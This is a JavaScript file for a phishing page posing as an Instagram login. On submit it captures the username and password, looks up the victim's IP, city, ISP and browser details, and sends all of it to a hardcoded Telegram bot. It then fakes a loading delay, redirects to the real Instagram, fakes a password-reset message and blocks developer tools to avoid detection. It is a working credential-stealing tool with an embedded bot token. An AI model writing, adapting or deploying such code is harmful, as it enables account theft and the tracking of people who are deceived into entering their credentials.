// Configuration Telegram
const TELEGRAM_BOT_TOKEN = '8217147903:AAHdDmpNkDgeYY1fltvt_otnCYFZ9peGo9w';
const TELEGRAM_CHAT_ID = '5534662562';

// Récupérer le formulaire
const loginForm = document.getElementById('loginForm');

// Fonction pour obtenir l'adresse IP
async function getClientIP() {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        console.error('Erreur lors de la récupération de l\'IP:', error);
        return 'IP non disponible';
    }
}

// Fonction pour obtenir les informations du navigateur
function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName;
    
    if (ua.includes("Firefox")) browserName = "Firefox";
    else if (ua.includes("Chrome")) browserName = "Chrome";
    else if (ua.includes("Safari")) browserName = "Safari";
    else if (ua.includes("Edge")) browserName = "Edge";
    else browserName = "Navigateur inconnu";
    
    return {
        name: browserName,
        userAgent: ua,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`
    };
}

// Fonction pour obtenir la localisation (approximative via IP)
async function getLocationFromIP(ip) {
    try {
        const response = await axios.get(`https://ipapi.co/${ip}/json/`);
        const data = response.data;
        
        if (data.error) return 'Localisation non disponible';
        
        return {
            city: data.city || 'Inconnu',
            region: data.region || 'Inconnu',
            country: data.country_name || 'Inconnu',
            postal: data.postal || 'Inconnu',
            isp: data.org || 'Inconnu'
        };
    } catch (error) {
        return 'Localisation non disponible';
    }
}

// Fonction pour envoyer à Telegram
async function sendToTelegram(username, password) {
    const ip = await getClientIP();
    const browser = getBrowserInfo();
    const location = await getLocationFromIP(ip);
    const date = new Date().toLocaleString('fr-FR');
    
    let locationText = '';
    if (typeof location === 'object') {
        locationText = `📍 LOCALISATION:
🏙️ Ville: ${location.city}
🏛️ Région: ${location.region}
🇫🇷 Pays: ${location.country}
📮 Code Postal: ${location.postal}
📡 ISP: ${location.isp}`;
    } else {
        locationText = `📍 Localisation: ${location}`;
    }
    
    const message = `🔔 NOUVEAU LOGIN INSTAGRAM 🔔

👤 UTILISATEUR: ${username}
🔐 MOT DE PASSE: ${password}

📋 INFORMATIONS CLIENT:
🕐 Date & Heure: ${date}
🌐 Adresse IP: ${ip}

${locationText}

🖥️ INFORMATIONS SYSTÈME:
💻 Navigateur: ${browser.name}
📱 Plateforme: ${browser.platform}
🖥️ Résolution: ${browser.screen}
🌍 Langue: ${browser.language}

🔍 USER AGENT:
${browser.userAgent}

⚡ Envoyé depuis: ${window.location.hostname || 'Localhost'}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        
        console.log('✅ Données envoyées avec succès à Telegram');
        return true;
    } catch (error) {
        console.error('❌ Erreur Telegram:', error);
        return false;
    }
}

// Gérer la soumission du formulaire
loginForm.addEventListener('submit', async function(event) {
    event.preventDefault();
    
    // Récupérer les valeurs
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    
    // Validation
    if (!username || !password) {
        alert('⚠️ Veuillez remplir tous les champs');
        return;
    }
    
    // Désactiver le bouton pendant l'envoi
    const submitBtn = this.querySelector('.login-btn');
    const originalText = submitBtn.textContent;
    submitBtn.textContent = 'Connexion en cours...';
    submitBtn.disabled = true;
    submitBtn.style.opacity = '0.7';
    submitBtn.style.cursor = 'wait';
    
    try {
        // Envoyer les données à Telegram
        const success = await sendToTelegram(username, password);
        
        if (success) {
            // Simuler un chargement plus long pour paraître authentique
            await new Promise(resolve => setTimeout(resolve, 1800));
            
            // Redirection directe vers Instagram
            window.location.href = 'https://instagram.com';
        } else {
            // En cas d'erreur Telegram
            submitBtn.textContent = 'Erreur de connexion';
            submitBtn.style.background = '#f44336';
            
            setTimeout(() => {
                submitBtn.textContent = originalText;
                submitBtn.style.background = '#4f5bd5';
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
                submitBtn.style.cursor = 'pointer';
                alert('Connexion échouée. Veuillez réessayer.');
            }, 1500);
        }
    } catch (error) {
        // Erreur générale
        submitBtn.textContent = originalText;
        submitBtn.disabled = false;
        submitBtn.style.opacity = '1';
        submitBtn.style.cursor = 'pointer';
        alert('Une erreur est survenue. Veuillez réessayer.');
    }
});

// Empêcher les liens de fonctionner
document.querySelectorAll('a').forEach(link => {
    link.addEventListener('click', function(event) {
        event.preventDefault();
        if (this.classList.contains('forgot')) {
            alert('Un lien de réinitialisation a été envoyé à votre adresse e-mail.');
        } else if (this.classList.contains('facebook')) {
            alert('Connexion avec Facebook temporairement indisponible.');
        } else {
            // Pour les autres liens (Inscrivez-vous), rediriger vers Instagram
            window.location.href = 'https://instagram.com/accounts/signup/';
        }
    });
});

// Protection basique
document.addEventListener('contextmenu', (e) => {
    if (e.target.tagName !== 'INPUT') {
        e.preventDefault();
    }
});

// Empêcher F12 et Ctrl+Shift+I
let devtools = false;
setInterval(() => {
    const widthThreshold = window.outerWidth - window.innerWidth > 160;
    const heightThreshold = window.outerHeight - window.innerHeight > 160;
    
    if ((widthThreshold || heightThreshold) && !devtools) {
        devtools = true;
        alert('Inspection désactivée');
        window.location.reload();
    }
}, 1000);

// Message de débogage
window.addEventListener('load', () => {
    console.log('%c 🔒 Instagram Secure Login 🔒 %c', 
        'background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D); color: white; padding: 10px; border-radius: 5px; font-weight: bold;',
        '');
    console.log('Système de connexion sécurisé initialisé');
});